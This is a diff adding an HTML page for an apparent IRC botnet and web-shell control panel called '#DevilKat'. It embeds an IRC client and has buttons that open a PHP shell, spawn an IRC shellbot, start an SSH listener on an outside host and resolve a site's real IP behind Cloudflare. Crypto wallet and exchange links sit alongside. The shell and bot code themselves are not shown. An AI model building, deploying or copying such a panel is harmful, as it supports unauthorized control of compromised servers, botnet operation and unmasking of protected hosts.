@@ -1,0 +1,80 @@
+<html>
+<head><script language="javascript">
+var titletext="#DevilKat"
+var repeat=false;    // SET TO true TO REPEAT, false TO "TYPE" OUT TITLE ONLY ONCE.
+set=setTimeout;
+var index=0;
+function scrolltitle(){
+if(index<=titletext.length){
+document.title=titletext.substring(0,index);
+index++;
+set('scrolltitle()', 200);
+}else{
+index=0;
+if(repeat)set('scrolltitle()',1000);
+}}
+window.onload=function(){
+if(!document.layers)set('scrolltitle()',1000);
+}
+</script></head>
+<title>#DevilKat</title>
+<link href="/shell/phpshell.ico" rel="icon" type="image/x-icon" />
+<body bgcolor="#000000">
+<table border="1" bordercolor="#ff0000" style="background-color:none" width="100%" cellpadding="3" cellspacing="3">
+	<tr>
+		<td><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:ff0000;">#DevilKat </span>&nbsp;&nbsp;<span style="font-family:Times;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">IRC Bot Control Panel</span></td>
+                <td><form name="Tick">
+<input type="text" size="12" name="Clock">
+</form>
+
+<script type="text/javascript">
+function show()
+{
+var Digital=new Date()
+var hours=Digital.getHours()
+var minutes=Digital.getMinutes()
+var seconds=Digital.getSeconds()
+var dn="AM" 
+if (hours>12)
+{
+dn="PM"
+hours=hours-12
+//this is so the hours written out is 
+//in 12-hour format, instead of the default //24-hour format.
+}
+if (hours==0)
+hours=12
+//this is so the hours written out 
+//when hours=0 (meaning 12a.m) is 12
+if (minutes<=9)
+minutes="0"+minutes
+if (seconds<=9)
+seconds="0"+seconds
+document.Tick.Clock.value=
+hours+":"+minutes+":"+seconds+" "+dn
+setTimeout("show()",1000)
+}
+show()
+</script></td>
+	</tr>
+</table>
+<table border="2" bordercolor="#ff0000" style="background-color:none" width="100%" cellpadding="3" cellspacing="3">
+	<tr>
+		<td><iframe src="https://kiwiirc.com/client?settings=3d2702c3c4e164ca8b8d6e963eb15d24" style="border:0; width:100%; height:400px;"></iframe></td>
+	</tr>
+</table>
+<table border="2" bordercolor="#ff0000" style="background-color:none" width="100%" cellpadding="3" cellspacing="3">
+	<tr>
+		<td><span style="font-family:Times;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">Tools: </span><input onclick="window.open('/phpshell.php','popUpWindow','height=340,width=650,left=100,top=100,resizable=yes,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no, status=yes');" type="button" value="PHP Shell" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span><input onclick="window.open('http://rook.twilightparadox.com/ssh.php','popUpWindow','height=250,width=200,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="Start SSH Listener" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span><input onclick="window.open('/shell/go.php','popUpWindow','height=440,width=650,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="Spawn IRC ShellBot" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span><input onclick="window.open('/shell/res.php','popUpWindow','height=440,width=650,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="Resolve Cloudflare IP" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span></span><input onclick="window.open('/shell/status.php','popUpWindow','height=440,width=650,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="Server Stats" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span></span><input onclick="window.open('http://infosniper.net','popUpWindow','height=440,width=900,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="infosniper" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span></span><input onclick="window.open('http://symbols.typeit.org/','popUpWindow','height=440,width=900,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="Symbols" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span></span><input onclick="window.open('/shell/calc.html','popUpWindow','height=410,width=610,left=100,top=100,resizable=no,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no, status=yes');" type="button" value="Calculator" /></td>
+	</tr>
+</table>
+<table border="2" bordercolor="#ff0000" style="background-color:none" width="100%" cellpadding="3" cellspacing="3">
+	<tr>
+		<td><span style="font-family:Times;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">Select: </span><input onclick="window.open('#','popUpWindow','height=340,width=650,left=100,top=100,resizable=yes,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no, status=yes');" type="button" value="1" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span><input onclick="window.open('#','popUpWindow','height=250,width=200,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="2" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span><input onclick="window.open('#','popUpWindow','height=440,width=650,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="3" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span><input onclick="window.open('#','popUpWindow','height=440,width=650,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="4" /><span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">-|-</span></span><input onclick="window.open('#','popUpWindow','height=440,width=650,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="5" />&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-family:Times;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">Wallets:</span><input onclick="window.open('http://blockchain.info','popUpWindow','height=440,width=900,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="฿" />&nbsp;<input onclick="window.open('http://dogechain.info','popUpWindow','height=440,width=900,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="Đ" />&nbsp;<input onclick="window.open('http://microwallet.org','popUpWindow','height=440,width=900,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="MicroWallet" />&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-family:Times;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">Exchanges:</span><input onclick="window.open('https://coinedup.com/','popUpWindow','height=440,width=900,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="CoinedUp" />&nbsp;&nbsp;<input onclick="window.open('https://cryptrader.com/','popUpWindow','height=440,width=900,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');" type="button" value="CrypTrader" /></td>
+               <td><img src="http://www.mariowiki.com/images/0/09/Nyan_Cat.gif"></img>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-family:Times;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">powered by</span>&nbsp;<span style="font-family:Times;font-size:20px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:3366FF;">internet katz.</span></td>
+	</tr>
+</table>
+</br>
+
+</body>
+</html>
